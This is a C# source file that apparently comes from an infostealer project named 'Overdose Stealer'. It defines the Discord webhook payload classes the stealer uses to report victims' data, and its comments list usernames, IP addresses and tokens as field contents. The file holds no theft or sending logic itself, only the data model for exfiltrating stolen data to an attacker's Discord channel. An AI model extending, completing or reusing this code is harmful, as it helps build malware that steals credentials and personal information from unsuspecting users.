using System.Collections.Generic;
using System.Text.Json.Serialization;

namespace Overdose_PublicStealer.Models
{
    // Represents a field in the embed (used to display custom data in the embed)
    internal class EmbedField
    {
        // The name of the field (e.g., "Username", "IP Address")
        [JsonPropertyName("name")]
        public string Name { get; set; }

        // The value of the field (e.g., the actual username or IP address)
        [JsonPropertyName("value")]
        public string Value { get; set; }

        // Specifies if the field should be displayed inline (true) or not (false)
        [JsonPropertyName("inline")]
        public bool Inline { get; set; }
    }

    // Represents the footer section of the embed (used for small text at the bottom)
    internal class EmbedFooter
    {
        // The text that will appear in the footer of the embed (usually for credits or additional information)
        [JsonPropertyName("text")]
        public string Text { get; set; }
    }

    // Represents the image in the embed (can display images in the embed)
    internal class EmbedImage
    {
        // The URL of the image to be displayed in the embed
        [JsonPropertyName("url")]
        public string Url { get; set; }
    }

    // Represents the main content of the embed message that will be sent to Discord
    internal class Embed
    {
        // The title of the embed (e.g., "Report", "Error Message")
        [JsonPropertyName("title")]
        public string Title { get; set; }

        // The description of the embed (provides details or context about the embed)
        [JsonPropertyName("description")]
        public string Description { get; set; }

        // The color of the embed's border (usually represented as an integer hex color code)
        [JsonPropertyName("color")]
        public int Color { get; set; }

        // A list of fields to display in the embed (e.g., username, token)
        [JsonPropertyName("fields")]
        public List<EmbedField> Fields { get; set; } = new List<EmbedField>();

        // The image to display in the embed (if applicable)
        [JsonPropertyName("image")]
        public EmbedImage Image { get; set; } = new EmbedImage
        {
            // Default image URL (can be changed later)
            Url = "https://i.pinimg.com/originals/6e/d5/d1/6ed5d17edc7859c15e4ba8b83186f3c6.gif"
        };

        // The footer that appears at the bottom of the embed (e.g., credit text)
        [JsonPropertyName("footer")]
        public EmbedFooter Footer { get; set; }
    }

    // Represents the overall webhook payload that includes the embed and other details (such as username and avatar URL)
    internal class WebhookPayload
    {
        // The username that will appear as the sender of the webhook (usually set to the tool's name)
        [JsonPropertyName("username")]
        public string Username { get; set; } = "Overdose Stealer";

        // The URL of the avatar image that will appear alongside the username
        [JsonPropertyName("avatar_url")]
        public string AvatarUrl { get; set; } = "https://i.pinimg.com/736x/56/a5/3c/56a53c0a581d8036e41f6de0656a869e.jpg";

        // The list of embeds (each embed represents a block of content within the webhook message)
        [JsonPropertyName("embeds")]
        public List<Embed> Embeds { get; set; } = new List<Embed>();
    }
}
